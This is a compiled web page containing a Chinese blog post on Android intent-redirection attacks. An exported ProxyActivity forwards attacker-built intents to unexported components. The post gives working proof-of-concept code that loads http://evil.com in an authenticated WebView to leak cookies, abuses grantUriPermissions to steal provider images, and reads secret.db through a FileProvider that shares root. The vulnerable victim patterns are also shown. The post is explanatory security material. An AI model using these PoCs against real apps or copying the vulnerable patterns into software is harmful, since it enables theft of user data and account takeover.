import{_ as s,c as a,o as n,N as l}from"./chunks/framework.3a9190c5.js";const C=JSON.parse('{"title":"为什么要保护未导出组件","description":"","frontmatter":{"title":"为什么要保护未导出组件","date":"2022-01-06T13:57:03.000Z","draft":false,"tags":["security","app","android"],"categories":["技术相关"]},"headers":[],"relativePath":"app_security/android_access_protected_components.md"}'),p={name:"app_security/android_access_protected_components.md"},o=l(`<p>安卓App的核心是四大组件,而这四大组件之间的通信主要依赖于Intent. 四大组件有导出的,也有未导出的,导出的组件任意app都可以通过Intent来启动.而未导出的组件则只能App自己才能启动. 所以很多时候未导出组件都认为启动它的Intent是可信的. 但是如果我们可以绕开这个限制,就找到新的攻击点.</p><h1 id="为什么未导出组件需要保护好" tabindex="-1">为什么未导出组件需要保护好 <a class="header-anchor" href="#为什么未导出组件需要保护好" aria-label="Permalink to &quot;为什么未导出组件需要保护好&quot;">​</a></h1><h2 id="未导出的activity篇" tabindex="-1">未导出的Activity篇 <a class="header-anchor" href="#未导出的activity篇" aria-label="Permalink to &quot;未导出的Activity篇&quot;">​</a></h2><p>我们有一个未导出的Webview,只能打开我们信任的页面,并且它是未导出的.</p><h3 id="victim的manifest" tabindex="-1">victim的manifest <a class="header-anchor" href="#victim的manifest" aria-label="Permalink to &quot;victim的manifest&quot;">​</a></h3><div class="language-xml line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">activity</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">.ProxyActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">exported</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">true</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">activity</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">.AuthWebViewActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">exported</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">false</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>同时app有一个ProxyActivity,用来启动其他Activity,并且是导出的.</p><h3 id="proxyactivity" tabindex="-1">ProxyActivity <a class="header-anchor" href="#proxyactivity" aria-label="Permalink to &quot;ProxyActivity&quot;">​</a></h3><p>ProxyActivity在后续例子中会一直使用.</p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#82AAFF;">startActivity</span><span style="color:#89DDFF;">((</span><span style="color:#A6ACCD;">Intent</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getIntent</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getParcelableExtra</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">extra_intent</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">));</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h3 id="victim的authwebviewactivity" tabindex="-1">victim的AuthWebViewActivity <a class="header-anchor" href="#victim的authwebviewactivity" aria-label="Permalink to &quot;victim的AuthWebViewActivity&quot;">​</a></h3><p>因为AuthWebViewActivity是未导出的,所以它天然信任其数据来源<code>getIntent</code>,其代码如下:</p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">webView</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">loadUrl</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getIntent</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getStringExtra</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">url</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">),</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getAuthHeaders</span><span style="color:#89DDFF;">());</span></span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="poc" tabindex="-1">poc <a class="header-anchor" href="#poc" aria-label="Permalink to &quot;poc&quot;">​</a></h3><p>针对这种情况,我们就可以构造这样的攻击代码:</p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> extra </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim.AuthWebViewActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">putExtra</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">url</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">http://evil.com/</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> intent </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim.ProxyActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">putExtra</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">extra_intent</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> extra</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#82AAFF;">startActivity</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">);</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>达到AuthWebView访问evil.com的目的,进而泄露cookie,盗取用户敏感信息,甚至是窃取用户账号的控制权.</p><h2 id="未导出的contentprovider" tabindex="-1">未导出的ContentProvider <a class="header-anchor" href="#未导出的contentprovider" aria-label="Permalink to &quot;未导出的ContentProvider&quot;">​</a></h2><p>ContentProvider可以认为是App的数据库,如果一个未导出的ContentProvider设置了\`\`android:grantUriPermissions\`为true,那么攻击者就可能借此获取到相关文件以及数据的读写权限.</p><p>与ContentProvider相关的一些关键Flag:</p><ul><li><code>Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</code> 永久访问这个ContentProvider的权限,没有设置的话只是一次性的.</li><li><code>Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</code> 授予的权限不是某个固定的uri,而是一批uri,这些uri只要有共同的前缀即可.</li><li><code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code> 授予读权限</li><li><code>Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code> 授予写权限</li></ul><p>下面我们来构造一个攻击样例:</p><h3 id="victim的manifest-1" tabindex="-1">victim的manifest: <a class="header-anchor" href="#victim的manifest-1" aria-label="Permalink to &quot;victim的manifest:&quot;">​</a></h3><div class="language-xml line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">provider</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim.ContentProvider</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">exported</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">false</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">authorities</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim.provider</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">grantUriPermissions</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">true</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">activity</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">.ProxyActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">exported</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">true</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> /&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>其中ProxyActivity同上.</p><h3 id="attacker的导出activity" tabindex="-1">attacker的导出Activity: <a class="header-anchor" href="#attacker的导出activity" aria-label="Permalink to &quot;attacker的导出Activity:&quot;">​</a></h3><p>LeakActivity.java</p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">Uri</span><span style="color:#A6ACCD;"> uri </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> Uri</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getIntent</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getDataString</span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">+</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">image/1</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">)</span><span style="color:#89DDFF;">;</span><span style="color:#A6ACCD;"> </span><span style="color:#676E95;font-style:italic;">// content://com.victim.provider/image/1</span></span>
<span class="line"><span style="color:#C792EA;">Bitmap</span><span style="color:#A6ACCD;"> bitmap </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> BitmapFactory</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">decodeStream</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getContentResolver</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">openInputStream</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">uri</span><span style="color:#89DDFF;">));</span><span style="color:#A6ACCD;"> </span><span style="color:#676E95;font-style:italic;">// stolen image</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="poc-1" tabindex="-1">poc: <a class="header-anchor" href="#poc-1" aria-label="Permalink to &quot;poc:&quot;">​</a></h3><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> extra </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setFlags</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">FLAG_GRANT_PREFIX_URI_PERMISSION</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">FLAG_GRANT_READ_URI_PERMISSION</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">FLAG_GRANT_WRITE_URI_PERMISSION</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getPackageName</span><span style="color:#89DDFF;">(),</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.attacker.LeakActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setData</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Uri</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">content://com.victim.provider/</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> intent </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim.ProxyActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">putExtra</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">extra_intent</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> extra</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#82AAFF;">startActivity</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">);</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h2 id="未导出的fileprovider" tabindex="-1">未导出的FileProvider <a class="header-anchor" href="#未导出的fileprovider" aria-label="Permalink to &quot;未导出的FileProvider&quot;">​</a></h2><p>FileProvider实际上是ContentProvider的一个子类,如同名字一样,其专注于文件的分享. 下面我们同样构造一个FileProvider的文件任意读写的例子:</p><h3 id="victim的manifest-2" tabindex="-1">victim的manifest <a class="header-anchor" href="#victim的manifest-2" aria-label="Permalink to &quot;victim的manifest&quot;">​</a></h3><div class="language-xml line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">provider</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">androidx.core.content.FileProvider</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">exported</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">false</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">authorities</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim.files_provider</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">grantUriPermissions</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">true</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">meta-data</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">android.support.FILE_PROVIDER_PATHS</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">resource</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">@xml/provider_paths</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">provider</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>注意到:</p><ol><li>它是FileProvider</li><li>它的android:grantUriPermissions</li><li>分享路径信息在<code>@xml/provider_paths</code>,也就是<code>res/xml/provider_paths.xml</code></li></ol><h3 id="res-xml-provider-paths-xml" tabindex="-1">res/xml/provider_paths.xml <a class="header-anchor" href="#res-xml-provider-paths-xml" aria-label="Permalink to &quot;res/xml/provider_paths.xml&quot;">​</a></h3><div class="language-xml line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;?</span><span style="color:#F07178;">xml</span><span style="color:#C792EA;"> version</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">1.0</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C792EA;"> encoding</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">utf-8</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">?&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">paths</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">root-path</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">root</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">path</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;&quot;</span><span style="color:#89DDFF;">/&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">files-path</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">internal_files</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">path</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">.</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">cache-path</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">cache</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">path</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;&quot;</span><span style="color:#89DDFF;">/&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">external-path</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">external_files</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">path</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">images</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">paths</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>这里顺便说一下,如无必要,尽量不要直接分享root,这是非常危险的,一旦被获取到权限,整个app的所有信息都会一览无余.</p><h3 id="attacker的leakactivity" tabindex="-1">attacker的LeakActivity <a class="header-anchor" href="#attacker的leakactivity" aria-label="Permalink to &quot;attacker的LeakActivity&quot;">​</a></h3><p>attacker要能收到相应的Intent,才能获取到文件的读写权限. LeakActivity.java</p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">InputStream</span><span style="color:#A6ACCD;"> i </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getContentResolver</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">openInputStream</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getIntent</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getData</span><span style="color:#89DDFF;">());</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h3 id="攻击poc" tabindex="-1">攻击poc <a class="header-anchor" href="#攻击poc" aria-label="Permalink to &quot;攻击poc&quot;">​</a></h3><p>和ContentProvider是类似的,只不过这次针对的是FileProvider.</p><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> extra </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setFlags</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">FLAG_GRANT_READ_URI_PERMISSION</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getPackageName</span><span style="color:#89DDFF;">(),</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.attacker.LeakActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">extra</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setData</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Uri</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> intent </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.victim.ProxyActivity</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">putExtra</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">extra_intent</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> extra</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#82AAFF;">startActivity</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">);</span></span>
